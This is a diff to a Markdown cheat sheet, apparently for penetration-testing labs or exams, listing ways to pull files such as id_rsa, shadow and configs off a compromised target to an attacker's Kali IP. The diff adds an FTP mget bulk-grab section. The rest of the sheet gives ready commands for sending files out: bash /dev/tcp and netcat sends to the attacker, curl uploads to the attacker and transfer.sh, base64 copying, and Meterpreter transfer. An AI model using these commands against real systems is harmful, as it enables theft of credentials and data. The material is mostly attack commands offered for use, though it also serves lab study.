@@ -5,7 +5,30 @@ All examples assume:
 - Your Kali/attacker IP: 192.168.129.39
 - File to transfer: /home/dogpics/secret.txt (or serverManager.c, id_rsa, shadow, etc.)
 
-## 1. Python Simple HTTP Server (Fastest & Most Common)
+## 1. FTP Bulk Download – Grab Everything (Most Useful)
+
+```ftp
+# Disable per-file confirmation prompt
+prompt off
+
+# Download ALL files in current directory (non-recursive)
+mget *
+
+# Download ALL files matching pattern
+mget *.txt
+mget *.php
+mget config*
+mget *.bak *.old *.conf
+mget id_* authorized_keys
+
+# Turn prompt back on (optional, good habit)
+prompt
+```
+
+>What happens if you **never** turn it back on (prompt)?
+>- Prompting stays **off** for the **rest of the FTP session**.
+>- If you later run another mget, mput, or even accidentally type mdelete *, it will **execute immediately without asking** — potentially dangerous in shared/exam/lab environments
+## 2. Python Simple HTTP Server (Fastest & Most Common)
 
 **On Target (send file):**
 ```bash
@@ -27,7 +50,7 @@ curl -O http://10.10.10.123:8000/secret.txt
 **Pros**: One-liner, no extra tools needed on target  
 **Cons**: Opens listening port (usually blocked by firewall)
 
-## 2. Netcat (nc) – Classic Raw Transfer
+## 3. Netcat (nc) – Classic Raw Transfer
 
 **Method A – Receiver on Kali, sender on target (most reliable)**
 
@@ -56,7 +79,7 @@ nc 192.168.129.39 4445 > secret.txt
 **Pros**: Very small binary, often already present  
 **Cons**: Direction matters, no resume, firewall may block
 
-## 3. Base64 – Text-Only Exfil (Firewall / no ports allowed)
+## 4. Base64 – Text-Only Exfil (Firewall / no ports allowed)
 **On Target (encode & print):**
 ```bash
 base64 -w0 /home/dogpics/secret.txt
@@ -79,7 +102,7 @@ echo -n "LONGBASE64STRINGHERE" | base64 -d > secret.txt
 **Pros**: Works through restrictive outbound filtering (HTTP/SSH/DNS allowed)  
 **Cons**: Manual copy-paste, size limit ~ few MB before painful
 
-## 4. Bash /dev/tcp – No Netcat/Python Needed (Pure Bash)
+## 5. Bash /dev/tcp – No Netcat/Python Needed (Pure Bash)
 **On Target (send file):**
 ```bash
 exec 3<>/dev/tcp/192.168.129.39/4445
@@ -96,7 +119,7 @@ nc -lvnp 4445 > secret.txt
 **Pros**: No extra binaries required (bash ≥ 4 usually has /dev/tcp)  
 **Cons**: Not all bash versions support it, no error handling
 
-## 5. Curl / Wget on Target (Outbound HTTP/HTTPS)
+## 6. Curl / Wget on Target (Outbound HTTP/HTTPS)
 **If target has curl/wget and can reach you**
 
 **Kali (host file):**
@@ -112,7 +135,7 @@ curl -F "file=@secret.txt" http://192.168.129.39:8000/upload
 curl --upload-file secret.txt https://transfer.sh/secret.txt
 ```
 
-## 6. Meterpreter – Full-Featured File Transfer (Metasploit Shell)
+## 7. Meterpreter – Full-Featured File Transfer (Metasploit Shell)
 **After getting Meterpreter session** (e.g. from php/meterpreter/reverse_tcp payload)
 
 ```meterpreter
